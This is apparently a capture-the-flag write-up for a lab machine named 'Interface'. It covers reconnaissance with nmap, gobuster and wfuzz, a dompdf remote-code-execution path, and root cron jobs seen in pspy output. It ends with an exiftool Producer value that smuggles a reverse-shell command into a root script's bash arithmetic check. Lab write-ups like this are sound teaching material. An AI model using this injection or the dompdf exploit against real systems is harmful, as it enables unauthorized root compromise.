# Interface

## IP = 10.10.11.200

### Initial
```
# nmap -sC -sV -oN nmap/initial 10.10.11.200 

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-25 04:32 EST
Nmap scan report for 10.10.11.200
Host is up (0.044s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:89:a0:95:7e:ce:ae:a8:59:6b:2d:2d:bc:90:b5:5a (RSA)
|   256 01:84:8c:66:d3:4e:c4:b1:61:1f:2d:4d:38:9c:42:c3 (ECDSA)
|_  256 cc:62:90:55:60:a6:58:62:9e:6b:80:10:5c:79:9b:55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site Maintenance
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
```

In some tags there's a `next-route-announcer`, so maybe is in Next.js

### By looking at the CSP settings in the initial request: http://prd.m.rendering-api.interface.htb
```
Content-Security-Policy:
	script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com;
	
	connect-src 'self' http://prd.m.rendering-api.interface.htb;

	style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com;

	img-src https: data:;

	child-src data:;
```
With gobuster on it we find:
- /vendor
- /vendor/composer
- /vendor/dompdf/dompdf/

With `/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt`:
- /api
- /api/html2pdf

### This is the default folder used by Composer: https://www.youtube.com/watch?v=H4mYxYuRYJ0
- /vendor/composer/installed.json

### We can fuzz parameters of `/api/html2pdf`. With JSON payload:
```
# wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt  -p 127.0.0.1:8080:HTTP -d '{"FUZZ":"FUZZ"}' --hh 36 -t 150 http://prd.m.rendering-api.interface.htb/api/html2pdf                          
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/html2pdf
Total requests: 17770

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000142:   200        76 L     184 W      1129 Ch     "html - html" 
```

### dompdf vulnerability: 
https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf
https://github.com/positive-security/dompdf-rce


### User.txt

### Pspy Output

```
2023/03/06 11:10:01 CMD: UID=0     PID=3110   | /bin/sh -c /usr/local/sbin/cleancache.sh 
2023/03/06 11:10:01 CMD: UID=0     PID=3111   | /bin/bash /root/clean.sh 
2023/03/06 11:10:01 CMD: UID=0     PID=3112   | find /var/www/api/vendor/dompdf/dompdf/lib/fonts/ -type f -cmin -5 -exec rm {} ; 
2023/03/06 11:10:01 CMD: UID=0     PID=3113   | rm /var/www/api/vendor/dompdf/dompdf/lib/fonts/dompdf_font_family_cache.php 
2023/03/06 11:10:01 CMD: UID=0     PID=3114   | rm /var/www/api/vendor/dompdf/dompdf/lib/fonts/exploit_normal_e7a8e905fb611a829b913a17ad7865a8.php 
2023/03/06 11:10:01 CMD: UID=0     PID=3115   | rm /var/www/api/vendor/dompdf/dompdf/lib/fonts/bau_normal_7481eefedea0158e1b0adb445820e06f.php 
2023/03/06 11:10:01 CMD: UID=0     PID=3117   | 
2023/03/06 11:10:01 CMD: UID=0     PID=3118   | cp /root/font_cache/dompdf_font_family_cache.php.bak /root/font_cache/dompdf_font_family_cache.php 
2023/03/06 11:10:01 CMD: UID=0     PID=3119   | chown www-data /root/font_cache/dompdf_font_family_cache.php 
2023/03/06 11:10:01 CMD: UID=0     PID=3120   | chgrp www-data /root/font_cache/dompdf_font_family_cache.php 
2023/03/06 11:10:01 CMD: UID=0     PID=3121   | 
2023/03/06 11:12:01 CMD: UID=0     PID=3122   | /usr/sbin/CRON -f 
2023/03/06 11:14:01 CMD: UID=0     PID=3127   | 
2023/03/06 11:14:01 CMD: UID=0     PID=3126   | /usr/sbin/CRON -f 
2023/03/06 11:14:16 CMD: UID=0     PID=3129   | 
2023/03/06 11:15:01 CMD: UID=0     PID=3137   | 
2023/03/06 11:15:01 CMD: UID=0     PID=3136   | /bin/bash /root/clean.sh 
2023/03/06 11:15:01 CMD: UID=0     PID=3135   | /bin/sh -c /root/clean.sh 
2023/03/06 11:15:01 CMD: UID=0     PID=3134   | /usr/sbin/CRON -f 
2023/03/06 11:15:01 CMD: UID=0     PID=3138   | /bin/bash /root/clean.sh 
2023/03/06 11:15:01 CMD: UID=0     PID=3140   | chgrp www-data /root/font_cache/dompdf_font_family_cache.php 
2023/03/06 11:15:01 CMD: UID=0     PID=3141   | 
2023/03/06 11:16:01 CMD: UID=0     PID=3144   | /bin/bash /usr/local/sbin/cleancache.sh 
2023/03/06 11:16:01 CMD: UID=0     PID=3143   | /bin/sh -c /usr/local/sbin/cleancache.sh 
2023/03/06 11:16:01 CMD: UID=0     PID=3142   | /usr/sbin/CRON -f 
```

### cleancache.sh
```sh
#! /bin/bash
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do

    if [[ -f "$cfile" ]]; then

        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)

        if [[ "$meta_producer" -eq "dompdf" ]]; then
            echo "Removing $cfile"
            rm "$cfile"
        fi

    fi

done
```

### Exploit: meta_producer is evaluated, so executed
1. Create a file with Producer as payload: `exiftool -Producer='a[$(/tmp/rev.sh>&2)]+42' privesc`
2. Wait the execution of `rev.sh`

### root.txt